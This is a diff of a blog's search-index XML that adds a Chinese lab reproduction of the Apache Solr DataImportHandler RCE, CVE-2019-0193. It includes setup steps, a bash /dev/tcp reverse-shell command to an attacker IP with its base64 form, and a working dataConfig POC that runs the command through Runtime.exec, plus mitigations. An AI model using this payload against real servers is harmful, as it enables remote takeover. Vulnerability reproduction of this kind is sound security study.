@@ -187,6 +187,17 @@
       </tags>
   </entry>
   <entry>
+    <title>python模块</title>
+    <url>/2021/03/27/python%E6%A8%A1%E5%9D%97/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python高级特性</title>
     <url>/2021/03/27/python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/</url>
     <content><![CDATA[]]></content>
@@ -248,36 +259,97 @@
       </tags>
   </entry>
   <entry>
-    <title>python模块</title>
-    <url>/2021/03/27/python%E6%A8%A1%E5%9D%97/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache Solr远程命令执行漏洞</title>
     <url>/2021/04/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%91%A1%20Solr%20RCE/</url>
     <content><![CDATA[<p><strong>漏洞编号</strong>：CVE-2019-0193</p>
 <p><strong>Solr</strong>：独立的企业级搜索应用服务器。使用java语言开发。</p>
 <p><strong>DataImportHandler</strong>：一个可选模块，用于从数据库和其他来源提取数据，其功能是整个DIH配置可以来自请求的<code>dataConfig</code>参数。DIH管理员屏幕的调试模式使用它可以方便地调试/开发DIH配置。</p>
-<p><strong>dataConfig</strong>：数据配置管理</p>
-<p><strong>DIH</strong>：数据库数据导入配置</p>
+<p><strong>dataConfig</strong>：数据配置管理。需要满足一定语法。其中<code>ScriptTransformer</code>可以编写自定义脚本，支持常见的脚本语言如<code>Javascript</code>、<code>JRuby</code>、<code>Jython</code>、<code>Groovy</code>和<code>BeanShell</code>。</p>
+<p><strong>ScriptTransformer</strong>：脚本转换器，允许使用java支持的任何脚本语言。函数应当以行（类型为Map&lt;String,Object&gt;）为参数，可以修改字段。脚本应当写在数据仓库配置文件顶级的script元素内，而转换器属性值为script:函数名。</p>
+<p><strong>DIH</strong>：数据库数据导入配置。</p>
+<p><strong>DataSource</strong>：数据源，定义了即将导入Solr的外部数据的位置。</p>
+<p><strong>UrlDataSource</strong>：数据源为URL地址。即导入Solr的数据来自<code>HTTP响应</code>，如RSS订阅源、atom订阅源、结构化的XML等。</p>
+<p><strong>Entity</strong>：实体。作用是被处理后生成Solr中的一组文档，包含多个字段（fields），这些字段用各种方式转换之后发送到Solr进行索引。</p>
+<p><strong>Processor</strong>：实体处理器。从外部数据源中提取数据内容，转换数据内容并将其添加到Solr索引中，可以编写<code>自定义实体处理器</code>来扩展或替换已提供的处理器。</p>
+<p><strong>Transformer</strong>：转换器。从外部数据源中获取的每一组字段，都可以选择性被转换器转换。此转换过程可以修改字段、创建新字段、或从单行生成多个rows/documents。</p>
 <h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>Apache Solr &lt; 8.2.0</p>
 <h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><p>DIH配置可以包含脚本，因此<code>dataConfig</code>参数存在安全风险。</p>
-<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><ul>
-<li>从Solr的8.2.0版本开始，使用此参数需要将Java系统属性“ enable.dih.dataConfigParam”设置为true。升级到8.2.0或更高版本，默认情况下是安全的。</li>
-<li>或者，编辑solrconfig.xml以配置所有DataImportHandler用法，并在“不变式”部分列出“ dataConfig”参数设置为空字符串。</li>
-<li>确保配置了网络设置，以便只有受信任的流量才能与Solr通信，尤其是与DIH请求处理程序通信。这是所有Solr的最佳做法。</li>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>下载：<a href="https://archive.apache.org/dist/lucene/solr/8.1.1/%EF%BC%88%E6%9C%AC%E6%96%87%E4%BD%BF%E7%94%A8kali%E5%AE%89%E8%A3%85%EF%BC%8C%E4%B8%8B%E8%BD%BDtgz%E6%96%87%E4%BB%B6%EF%BC%89">https://archive.apache.org/dist/lucene/solr/8.1.1/（本文使用kali安装，下载tgz文件）</a></p>
+<p>解压：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ar zxvf solr-8.1.1.tgz </span><br></pre></td></tr></table></figure>
+
+<p>切换到solr中的bin目录，启动solr：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">./solr start</span><br></pre></td></tr></table></figure>
+
+<p>访问localhost:8983/solr</p>
+<p><img src="https://i.loli.net/2021/04/28/r3mI87uLeX1Abxo.png"></p>
+<p>环境搭建成功。</p>
+<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><p>创建一个core：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">./solr create -c test3</span><br></pre></td></tr></table></figure>
+
+<p>选择刚刚创建的core。</p>
+<p>可以看到存在<code>DataImportHandler</code>模块，受该漏洞影响。</p>
+<p><img src="https://i.loli.net/2021/04/29/iazk8CDHGOfLxUQ.png" alt="image-20210429145648244"></p>
+<p>获取Solr中所有core的信息，可以看到core_name：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8983&#x2F;solr&#x2F;admin&#x2F;cores</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><p>点击<code>Dataimport</code>，如果报<code>The solrconfig.xml file for this index does not have an operational DataImportHandler defined!</code>错误，可以参考此文章解决：<a href="https://blog.csdn.net/A_bad_horse/article/details/114261936">https://blog.csdn.net/A_bad_horse/article/details/114261936</a></p>
+<ul>
+<li><strong>勾选<code>Debug</code> ：为了有回显结果。</strong></li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/30/Fw6HqxSrzc4laBY.png" alt="image-20210430093630565"></p>
+<ul>
+<li><p><strong>DataConfig信息：DataConfig中实体、字段标签有哪些属性取决于用了哪个处理器和转换器。</strong></p>
+<p><code>&lt;document&gt;</code>中的<code>&lt;entity&gt;</code>实体标签里说明了该实体的属性：</p>
+</li>
+</ul>
+<ol>
+<li>属性<code>name</code>：必填，用于标识实体的唯一名称。</li>
+<li>属性<code>processor</code>：可选项。默认值为<code>SqlEntityProcessor</code>，所以当数据源不是RDBMS时必须填写该项。对于<code>URLDataSource</code>类型的数据源而言，它的值必须为<code>XPathEntityProcessor</code>（根据官方说明只能使用XPathEntityProcessor对“URL的HTTP响应”做处理）。</li>
+<li>属性<code>transformer</code>：可选项。填写格式为<code>transformer=&quot;script:&lt;function-name&gt;&quot;</code> 指定了转换数据时具体的Transformer需要执行的脚本函数的名称。</li>
+<li>属性<code>forEach</code>：必填。值为Xpath表达式，用于划分记录。如果有多种类型的记录就用<code>|</code>符号把这些表达式分隔开。</li>
+<li>属性<code>url</code>：值用于调用REST API的URL（可以模板化）。</li>
+</ol>
+<ul>
+<li><strong>在<code>&lt;dataConfig&gt;</code>中的<code>&lt;script&gt;</code>标签中，写脚本函数。</strong></li>
+</ul>
+<ol>
+<li><code>CDATA</code>区段中的文本会被解析器忽略。因为xml元素中“&lt;”和“&amp;”是非法的，某些文本（如JavaScript代码）包含大量非法字符。为了避免错误，可以将脚本代码定义为CDATA。</li>
+<li><code>function</code>语句：声明一个函数。</li>
+<li><code>java.lang.Runtime.getRuntime().exec()</code>：在java中调用操作系统的程序。在调用命令后就直接返回当前线程了。</li>
+<li><code>bash -c</code>：bash从字符串中读入命令，如果字符串后还有变量就被设定为从$0开始的位置参数。</li>
+<li><code>|</code>：管道符，前一个命令的输出作为后一个命令的输入。</li>
+</ol>
+<p>Linux nc反弹shell命令：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.242.128/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- bash -i：产生一个交互式bash。bash是Linux的一个常见shell。 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &gt;&amp; /dev/tcp/ip/port：建立TCP连接，并将标准输出和错误重定向到TCP连接。ip/port为攻击机的ip和端口。 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 0&gt;&amp;1：从TCP连接获取输入。0：攻击机的输入。1：命令执行的结果。 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 整个命令即把bash的输出重定向到攻击机的指定端口，则目标机上执行的指令都只在攻击机上回显。 --&gt;</span>    </span><br><span class="line"></span><br><span class="line">bash64编码结果：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Mi4xMjgvNjY2NiAwPiYx</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Mi4xMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">&quot;stackoverflow&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">url</span>=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">processor</span>=<span class="string">&quot;XPathEntityProcessor&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">forEach</span>=<span class="string">&quot;/feed&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">transformer</span>=<span class="string">&quot;script:poc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在攻击机开启监听。</p>
+<p><img src="https://i.loli.net/2021/04/30/sd1OWUYGLScXV25.png" alt="image-20210430113437402"></p>
+<p>将POC填入，发送。</p>
+<p><img src="https://i.loli.net/2021/04/30/LYUVk4vNBuyqlP7.png" alt="image-20210430113841243"></p>
+<p>getshell。</p>
+<p><img src="https://i.loli.net/2021/04/30/Hp7ONoRiKB1XbM2.png" alt="image-20210430114149910"></p>
+<p><img src="https://i.loli.net/2021/04/30/lzONjAxbdPDpJu9.png" alt="image-20210430125348393"></p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>看这个：<a href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></p>
+<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><ul>
+<li><p>从Solr的8.2.0版本开始，使用此参数需要将Java系统属性“ enable.dih.dataConfigParam”设置为true。升级到8.2.0或更高版本，默认情况下是安全的。</p>
+</li>
+<li><p>或者，编辑solrconfig.xml以配置所有DataImportHandler用法，并在“不变式”部分列出“ dataConfig”参数设置为空字符串。</p>
+</li>
+<li><p>确保配置了网络设置，以便只有受信任的流量才能与Solr通信，尤其是与DIH请求处理程序通信。这是所有Solr的最佳做法。</p>
+</li>
 </ul>
 <h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
 <li><a href="https://issues.apache.org/jira/browse/SOLR-13669">https://issues.apache.org/jira/browse/SOLR-13669</a></li>
 <li><a href="https://blog.csdn.net/weixin_43583637/article/details/102875284">https://blog.csdn.net/weixin_43583637/article/details/102875284</a></li>
 <li><a href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></li>
 <li><a href="https://xz.aliyun.com/t/5965#toc-6">https://xz.aliyun.com/t/5965#toc-6</a></li>
+<li><a href="https://blog.csdn.net/qq_17204441/article/details/97341408">https://blog.csdn.net/qq_17204441/article/details/97341408</a></li>
 </ul>
 ]]></content>
       <categories>
